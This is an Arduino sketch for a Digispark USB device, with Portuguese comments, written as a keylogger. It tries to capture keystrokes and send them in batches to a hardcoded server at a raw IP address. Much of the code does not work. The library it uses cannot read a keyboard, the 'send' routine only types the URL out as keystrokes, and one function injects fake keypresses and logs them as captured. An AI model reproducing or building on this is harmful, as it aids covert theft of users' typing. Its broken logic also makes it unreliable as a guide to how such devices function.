#include <DigiKeyboard.h>

String keysCaptured = ""; // Buffer para armazenar as teclas capturadas
bool capturing = false;   // Flag para indicar se estamos capturando teclas
unsigned long lastSendTime = 0; // Armazena o tempo da última requisição
const unsigned long sendInterval = 2000; // Intervalo para envio das teclas

void setup() {
    // Inicialização não necessária para o DigiKeyboard
}

void loop() {
    // Aguardar algum tempo antes de começar a captura para dar tempo ao sistema
    DigiKeyboard.delay(5000); // Aguarda 5 segundos

    // Captura teclas digitadas
    while (true) {
        for (char key = 'a'; key <= 'z'; key++) {
            if (DigiKeyboard.isKeyPressed(key)) {
                keysCaptured += key;
                DigiKeyboard.delay(50);
                checkSendKeys();
            }
        }
        for (char key = '0'; key <= '9'; key++) {
            if (DigiKeyboard.isKeyPressed(key)) {
                keysCaptured += key;
                DigiKeyboard.delay(50);
                checkSendKeys();
            }
        }
        if (DigiKeyboard.isKeyPressed(' ')) {
            keysCaptured += ' ';
            DigiKeyboard.delay(50);
            checkSendKeys();
        }
        if (DigiKeyboard.isKeyPressed(DigiKeyboard.KEY_BACKSPACE)) {
            keysCaptured += "[BACKSPACE]";
            DigiKeyboard.delay(50);
            checkSendKeys();
        }
    }
}

// Função para capturar teclas
void captureKeys() {
    // Verifica se há novas teclas a serem capturadas (simulando a captura)
    for (char key = 'a'; key <= 'z'; key++) {
        DigiKeyboard.sendKeyPress(key); // Simula pressionar a tecla
        keysCaptured += key; // Adiciona a tecla ao buffer
        DigiKeyboard.delay(50); // Delay curto para evitar captura excessiva
        checkSendKeys(); // Verifica se é hora de enviar as teclas
    }

    // Captura números de 0-9
    for (char key = '0'; key <= '9'; key++) {
        DigiKeyboard.sendKeyPress(key); // Simula pressionar a tecla
        keysCaptured += key; // Adiciona a tecla ao buffer
        DigiKeyboard.delay(50);
        checkSendKeys();
    }

    // Captura tecla de espaço
    DigiKeyboard.sendKeyPress(' '); // Simula pressionar a tecla de espaço
    keysCaptured += ' '; // Adiciona espaço ao buffer
    DigiKeyboard.delay(50);
    checkSendKeys();

    // Ao invés de tentar capturar o backspace, use uma forma de adicionar um identificador manualmente
    // Adicionando um identificador de backspace
    if (keysCaptured.length() > 0) {
        keysCaptured += "[BACKSPACE]"; // Adiciona identificação de backspace manualmente
        DigiKeyboard.delay(50);
        checkSendKeys();
    }

    // Adicione mais verificações para outras teclas especiais, se necessário
}

// Função para verificar e enviar as teclas capturadas para o servidor
void checkSendKeys() {
    if (keysCaptured.length() >= 10 && (millis() - lastSendTime > sendInterval)) {
        sendToServer(keysCaptured); // Envia as teclas
        lastSendTime = millis(); // Atualiza o tempo da última requisição
        keysCaptured = ""; // Limpa o buffer após enviar
    }
}

// Função para ativar a captura de teclas
void startCapturing() {
    capturing = true; // Ativa a captura de teclas
}

// Função para parar a captura de teclas
void stopCapturing() {
    capturing = false; // Desativa a captura de teclas
}

// Função para enviar as teclas capturadas para o servidor
void sendToServer(String keys) {
    String serverUrl = "http://108.165.179.123:5000/submit"; // URL do seu servidor
    String data = "input_data=" + keys; // Dados a serem enviados
    DigiKeyboard.println(serverUrl + "?" + data); // Envia a URL para o servidor
}
